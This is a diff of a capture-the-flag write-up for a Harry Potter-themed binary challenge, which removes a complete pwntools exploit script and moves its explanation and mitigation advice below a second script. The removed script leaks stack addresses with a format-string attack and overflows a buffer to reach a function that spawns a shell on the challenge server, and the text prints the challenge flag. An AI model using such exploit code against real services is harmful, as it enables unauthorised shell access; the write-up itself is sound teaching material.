@@ -233,105 +233,6 @@ The function **welcome()** contains a printf() call, which can be abused for a f
 We can calulate the difference of the address from **WINguardium\_leviosa()** and the leaked address with gdb. If we know this difference, we can calculate the address of **WINguardium\_leviosa()** for every execution of the binary, even if PIE is enabled.
 
 The following exploit gives us a shell on the Server.
-```
-from pwn import *
-
-HOST = 'hax1.allesctf.net'
-PORT = '9100'
-
-#r = remote('localhost','9100')
-p = remote(HOST,PORT)
-#p = process("./pwn1")
-
-def remoteExploit():
-    r = remote(HOST,PORT)
-
-# leak a code address from the stack and use known offsets to calculate the WIN address
-def leakAddresses():
-    #witchNameQuestion = p.recvuntil('Enter your witch name:\n')
-    #print(witchNameQuestion)
-    formatStringAttack = (65-26)*"|%p|"
-    p.sendlineafter('Enter your witch name:\n', formatStringAttack)
-    stackDump = p.recvuntil(" enter your magic spell:\n")
-    print(stackDump.decode('UTF-8'))
-    #print(stackDump)
-    stackDumpArray = stackDump.split(b"|")
-
-    #get the last element 
-    mainAddr = stackDumpArray[-2]
-    #print(mainAddr)
-
-    #calculate difference of WINgardium function and main instruction at addr mainAddr
-    #this can be calculated with gdb
-    print("Address of instruction in main function: {}".format(mainAddr.decode()))
-    winAdr =  int(mainAddr.decode(),16) - 0x135
-    return winAdr
-
-# use the winAdr to overwrite the return address from AAAAAAAAA()
-def localExploit(winAdr,offsetSize):
-    #raw_input("wait for gdb") 
-    #leviosaAdr = pack(0x00005555555549ec, 64, 'little', False)
-    payload = b"Expelliarmus\x00"
-    #payload += cyclic(offsetSize)
-    payload += offsetSize*b'A'
-    #also push a pop/ret/push instruction on the stack to align the stack (the win function contains a ret instruction at winAdr+0x36)
-    payload += p64(winAdr+0x36)
-    payload += p64(winAdr)
-
-    print(payload)
-    p.sendline(payload)
-    #print(p.recvuntil("-10 Points for Hufflepuff!\n").decode('utf-8'))
-    print(p.recvuntil("~ Protego!\n").decode('utf-8'))
-    p.interactive()
-
-def findOffset():
-
-    c = "Expelliarmus\x00"+cyclic(0x2ff).decode()
-
-    #start gdb 
-    io = gdb.debug('./pwn1', '''
-        break main
-        continue
-    ''')
-    #p.recvuntil("Enter your witch name:\n")
-    #send our cyclic input
-    io.sendline(c)
-
-    #interactive to keep the process alive
-    io.interactive()
-
-    #result:
-    # "cnaa" is on top of the stack when the binary crashes -> use cyclic_find to get offset for the bufferoverflow
-    return int(hex(cyclic_find("cnaa")),16)
-    # so offset for the buffer overflow is 0xfb
-
-if __name__=='__main__':
-    #start gdb to get the offset for the buffer overflow
-    #offset = findOffset()
-    offset = int(hex(cyclic_find("cnaa")),16)
-
-    winAdr = leakAddresses()
-    print("calculated WIN address: {}".format(hex(winAdr)))
-
-    localExploit(winAdr, offset)
-```
-
-The script leaks an address of an instruction from the main method and also the stack canary, which are both placed on the Stack. The stack canary can also be found with GDB, its placed before the return address on the stack and starts with a zero byte.
-The calculated difference of this instruction and **WINguardium\_leviosa()** (calculated with GDB) is substracted from the leaked address, to get the address of **WINguardium\_leviosa()**.
-Now we can use the buffer overflow from **AAAAAAAA()**, to place the leaked canary and override the return address of this function with the calculated **WINguardium\_leviosa()** address.
-
-This will lead to execute **system("bin/sh")** on the server, which allows us to list the files on the server and leak the content of the file **flag**: **CSCG{NOW_PRACTICE_MORE}**
-
-![](writeupfiles/pwn1Result.png)
-
-
-To avoid this exloit, secure functions can be used. Like **fgets()** instead of **gets()**, or a boundary check in general can be usefull to avoid buffer overflows.
-The format string attack, can be avoided with correct usage of format strings, like **printf("%s", message)** instead of **printf(message)**.
-
-
-
-
-
 
 ```
 from pwn import *
@@ -433,3 +334,19 @@ if __name__=='__main__':
 
     localExploit(winAdr, offset,canary)
 ```
+
+
+
+The script leaks an address of an instruction from the main method and also the stack canary, which are both placed on the Stack. The stack canary can also be found with GDB, its placed before the return address on the stack and starts with a zero byte.
+The calculated difference of this instruction and **WINguardium\_leviosa()** (calculated with GDB) is substracted from the leaked address, to get the address of **WINguardium\_leviosa()**.
+Now we can use the buffer overflow from **AAAAAAAA()**, to place the leaked canary and override the return address of this function with the calculated **WINguardium\_leviosa()** address.
+
+This will lead to execute **system("bin/sh")** on the server, which allows us to list the files on the server and leak the content of the file **flag**: **CSCG{NOW_PRACTICE_MORE}**
+
+![](writeupfiles/pwn2Result.png)
+
+
+To avoid this exloit, secure functions can be used. Like **fgets()** instead of **gets()**, or a boundary check in general can be usefull to avoid buffer overflows.
+The format string attack, can be avoided with correct usage of format strings, like **printf("%s", message)** instead of **printf(message)**.
+If we can avoid the format string attack, and an attack ist't able to get the stack canary, he cannot abuse the buffer overflow.
+
